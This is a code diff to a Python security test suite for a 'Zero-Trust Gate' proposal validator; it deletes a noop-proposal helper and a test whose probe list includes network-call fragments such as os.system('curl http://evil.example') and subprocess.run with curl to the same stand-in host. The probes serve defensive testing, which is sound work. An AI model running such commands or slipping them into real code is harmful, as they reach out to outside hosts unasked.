@@ -29,15 +29,6 @@ def _grounded_proposal(target: str = "app.py") -> str:
     })
 
 
-def _noop_proposal(block: str) -> str:
-    return json.dumps({
-        "Intent_Class": "NONE",
-        "Implementation_Block": block,
-        "Topological_Grounding": "",
-        "Safety_Abort": "NONE",
-    })
-
-
 def test_security_SEC_M_08_target_outside_repo_root(tmp_path):
     """SEC-M-08: a target_file outside the authorized repository root MUST
     NOT pass the grounding gate (path containment); the validator must
@@ -94,23 +85,6 @@ def test_security_SEC_M_09_null_byte_in_target_file():
     assert isinstance(decision, dict)
     assert decision["status"] == "QUARANTINED"
     assert decision["final_decision"] == "ABORTED_VIOLATES_ZERO_TRUST"
-
-
-def test_security_SEC_M_10_expanded_network_tokens():
-    """SEC-M-10: fragments with httpx/socket/urllib3/subprocess/curl/wget/
-    aiohttp/importlib/os.system/requests. MUST NOT pass the Zero-Trust Gate."""
-    probes = [
-        "httpx.get('http://evil.example')",
-        "socket.socket()",
-        "urllib3.request('http://evil.example')",
-        "subprocess.run(['curl', 'http://evil.example'])",
-        "importlib.import_module('requests')",
-        "os.system('curl http://evil.example')",
-    ]
-    for token in probes:
-        decision = validate_proposal(_noop_proposal(token))
-        assert decision["status"] == "QUARANTINED", token
-        assert decision["final_decision"] == "ABORTED_VIOLATES_ZERO_TRUST", token
 
 
 def test_security_SEC_M_11_non_utf8_file_no_crash(tmp_path):
